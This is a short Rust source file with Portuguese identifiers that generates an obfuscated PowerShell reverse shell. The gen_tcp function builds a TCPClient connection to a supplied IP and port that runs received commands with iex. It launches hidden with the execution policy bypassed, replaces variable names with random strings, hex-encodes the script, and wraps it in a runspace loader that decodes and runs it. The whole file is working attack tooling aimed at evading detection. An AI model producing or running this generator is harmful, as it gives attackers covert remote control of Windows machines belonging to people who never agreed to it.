use regex::Regex;
use rand::Rng;
use std::iter;

fn generate(len: usize) -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::rng();
    let one_char = || CHARSET[rng.random_range(0..CHARSET.len())] as char;
    iter::repeat_with(one_char).take(len).collect()
}
fn string_para_hex(s: &str) -> String {
    s.as_bytes()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect()
}

pub fn gen_tcp(ip:&str, port:&str){

    let tamanho: usize = 20;

    let ip_filtro = Regex::new(r"IP").unwrap();
    let port_filtro = Regex::new(r"PORT").unwrap();
    let stream_filtro = Regex::new(r"stream").unwrap();
    let client_filtro = Regex::new(r"client").unwrap();
    let bytes_filtro = Regex::new(r"bytes").unwrap();
    let data_filtro = Regex::new(r"data").unwrap();
    let sendback_filtro = Regex::new(r"sendback").unwrap();
    let sendback2_filtro = Regex::new(r"sendback2").unwrap();


    let script_base:String = r"Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop -c ".to_string();
    let client = r"$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);";
    let stream = r"$stream = $client.GetStream();";
    let bytes = r"[byte[]]$bytes = 0..65535|%{0};";
    let whilestr = r"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;";
    let data = r"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);";
    let sendback = r"$sendback = (iex $data 2>&1 | Out-String );";
    let sendback2 = r"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';";
    let sendbyte = r"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);";
    let write = r"$stream.Write($sendbyte,0,$sendbyte.Length);";
    let flush = r"$stream.Flush()};$client.Close()} -WindowStyle Hidden";
    
   
    let script_final = script_base + &client + &stream + bytes + whilestr +data+sendback+sendback2+sendbyte+write+ flush;
    
    

    let teste = stream_filtro.replace_all(&script_final, generate(tamanho));
    let teste = client_filtro.replace_all(&teste, generate(tamanho));
    let teste = bytes_filtro.replace_all(&teste,generate(tamanho));
    let teste = data_filtro.replace_all(&teste, generate(tamanho));
    let teste = sendback_filtro.replace_all(&teste,generate(tamanho));
    let teste = sendback2_filtro.replace_all(&teste,generate(tamanho));
    let  teste = ip_filtro.replace_all(&teste, ip);
    let  teste = port_filtro.replace_all( &teste,port);

    let injector = r"$teste='".to_string();
    let injector2 = r" $final = $teste -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16)};";
    let injector3 = r"$tenebres=[System.Text.Encoding]::UTF8.GetString($final); $runspace=[RunspaceFactory]::CreateRunspace(); $runspace.Open(); $ps = [PowerShell]::Create().AddScript($tenebres);$ps.Runspace = $runspace;$ps.Invoke();$runspace.Close() ";

    let teste = injector + &string_para_hex(&teste)+ "';" + injector2 + injector3;
 
    // let teste = variavel_filtro.replace_all(&teste, "VARIAVEL");


    println!("{}",teste);



}